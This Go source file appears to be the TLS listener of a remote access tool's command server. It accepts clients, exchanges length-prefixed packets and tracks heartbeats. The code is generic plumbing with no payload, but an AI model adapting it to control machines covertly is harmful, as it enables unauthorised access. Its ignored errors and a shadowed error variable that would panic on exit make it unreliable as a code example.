package main

import (
	"crypto/tls"
	"encoding/binary"
	"io"
	"rat/command/log"
	"rat/shared"
	"rat/shared/network"
)

// TLSServer is the default TCP server using TLS encryption
type TLSServer struct {
	Address string `json:"host"`
}

func (server TLSServer) Listen() error {
	// Load local keypair
	cert, _ := tls.LoadX509KeyPair("cert.pem", "private.key")
	config := tls.Config{Certificates: []tls.Certificate{cert}}

	// Spawn server
	listener, _ := tls.Listen("tcp", server.Address, &config)

	for {
		conn, err := listener.Accept()

		if err != nil {
			log.Println(err.Error())
			continue
		}

		client := NewClient(conn)
		client.Reader = network.Reader{conn}
		client.Writer = network.Writer{conn}

		go server.ReadRoutine(client)
		go server.WriteRoutine(client)
		go client.Heartbeat()
	}
}

// ReadRoutine is the routine for continuously reading packets for this client
// Removes client on any read error, invalid packet header or deserializing error
func (server TLSServer) ReadRoutine(c *Client) {
	var err error
	for {
		h, err := c.ReadHeader()

		if err != nil {
			break
		}

		var n int32
		err = binary.Read(c.Reader.Reader, shared.ByteOrder, &n)
		buf := make([]byte, n)
		io.ReadFull(c.Reader.Reader, buf)

		packet := GetIncomingPacket(h)

		packet, err = packet.Decode(buf)

		if err != nil {
			break
		}

		packet.OnReceive(c)
	}

	log.Println("remove", err.Error())
	removeClient(c)
}

// WriteRoutine polls all packets added to the packet channel for a specific client
// Will call Init() on each packet and write it
func (server TLSServer) WriteRoutine(client *Client) {
	for {
		packet := <-client.Queue
		packet.Init(client)
		client.WritePacket(packet)
	}
}
